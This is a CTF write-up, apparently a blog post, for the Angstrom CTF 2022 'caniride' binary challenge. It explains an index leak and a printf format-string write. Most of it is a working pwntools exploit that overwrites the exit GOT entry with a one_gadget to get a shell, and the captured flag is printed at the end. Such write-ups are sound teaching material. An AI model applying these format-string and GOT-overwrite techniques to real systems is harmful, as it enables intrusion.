---
title: "[Pwn] caniride [Angstrom CTF 2022]"
date: 2022-05-07 00:47:00
---

# 0x0 Introduction

We've developed a direct competitor to Uber, using blockchain technology.

nc challs.actf.co 31228

Author: JoshDaBosh

files: [caniride](caniride), [libc.so.6](libc.so.6)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```


# 0x2 Vulnerability

todo

in simple word, use this bug to leak binary base address using `obj.__dso_handle`

```
 if (4 < var_440h) {
        sym.imp.puts("Not enough drivers! Sorry.");
        sym.imp.exit(1);
    }
```

Then use `printf("%*d", width, num)` to write data

in this case, `%{num}$0*{value_offset}$d%{addr_offset}$hn`

1. leak libc, return to main
2. write rip to one_gadget, get shell


# 0x3 Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./caniride_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def log_print(*msg):
    log.info(" ".join(map(str,msg)))

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("challs.actf.co", 31228)
    return r


lp = log_print
io = start()

leak_offset = (exe.symbols["__dso_handle"] - exe.symbols["drivers"]) // 8

got_exit_0 = (((0x7ffeb326e300 - 0x3f0) - 0x7ffeb326dec0) // 8) + 6
got_exit_1 = got_exit_0 + 1
got_exit_2 = got_exit_0 + 2
val_0 = got_exit_0+3
main_addr_0 =got_exit_0 + 4
main_addr_1 =got_exit_0 + 5
main_addr_2 =got_exit_0 + 6

printf_payload = f"%{val_0}$0*{main_addr_0}$d%{got_exit_0}$hn%{val_0}$0*{main_addr_1}$d%{got_exit_1}$hn%{val_0}$0*{main_addr_2}$d%{got_exit_2}$hn"
lp("printf payload",printf_payload)
io.sendafter(b"Name: ",flat({0:[printf_payload.encode()]},length=49,filler=b"\x00"))
io.sendlineafter(b"driver: ",str(leak_offset).encode())
io.recvuntil(b"this is ")
leak_addr = int.from_bytes(io.recvuntil(b" your driver",drop=True),"little")
exe.address = leak_addr - exe.symbols["__dso_handle"]
lp("got exit",hex(exe.got["exit"]))
lp(hex(exe.address),hex(exe.symbols["drivers"]),hex(exe.symbols["__gmon_start__"]))
addr_x = [
    [exe.got["exit"]+0,exe.sym["main"] & 0xffff],
    [exe.got["exit"]+2,(exe.sym["main"] >> (8*2)) & 0xffff],
    [exe.got["exit"]+4,(exe.sym["main"] >> (8*4)) & 0xffff],
]
lp("main addr",hex(exe.sym["main"]))
addr_x.sort(key=lambda x:x[1])
io.sendafter(b"yourself: ",flat({
    0:[i[0] for i in addr_x] + [0] + [
        addr_x[0][1],
        addr_x[1][1] - addr_x[0][1],
        addr_x[2][1] - addr_x[1][1]
        ]
}))
leak_libc =  ((0x7ffeb28748c8 - 0x7ffeb2874030)  // 8) + 6
printf_payload_2 = f"%{leak_libc}$pENDL"
lp("leak libc payload",printf_payload_2)
io.sendafter(b"Name: ",printf_payload_2.encode().ljust(49,b'\x00'))
io.sendlineafter(b"driver: ",b'1')
io.sendafter(b"yourself: ",b'abc')
io.recvuntil(b"Bye, ")
tmp = io.recvuntil(b"ENDL",drop=True)
lp("libc start main return",tmp)
libc.address = int(tmp,16) - libc.libc_start_main_return
lp("libc base addr",hex(libc.address))


one_gadget = libc.address+0xe3b31 # r15 == NULL & rdx == NULL
lp("one gadget addr",hex(one_gadget))

printf_payload = f"%{val_0}$0*{main_addr_0}$d%{got_exit_0}$hn%{val_0}$0*{main_addr_1}$d%{got_exit_1}$hn%{val_0}$0*{main_addr_2}$d%{got_exit_2}$hn"
lp("printf payload",printf_payload)
io.sendafter(b"Name: ",printf_payload.encode().ljust(49,b'\x00'))
io.sendlineafter(b"driver: ",b'1')
addr_x = [
    [exe.got["exit"]+0,one_gadget & 0xffff],
    [exe.got["exit"]+2,(one_gadget >> (8*2)) & 0xffff],
    [exe.got["exit"]+4,(one_gadget >> (8*4)) & 0xffff],
]
addr_x.sort(key=lambda x:x[1])

io.sendafter(b"yourself: ",flat({
    0:[i[0] for i in addr_x] + [0] + [
        addr_x[0][1],
        addr_x[1][1] - addr_x[0][1],
        addr_x[2][1] - addr_x[1][1]
        ]
}))


io.recvuntil(b'\n')
io.interactive()

```

# 0x4 Flag

actf{h0llerin'_at_y0u_from_a_1977_mont3_car1o_a6ececa9966d}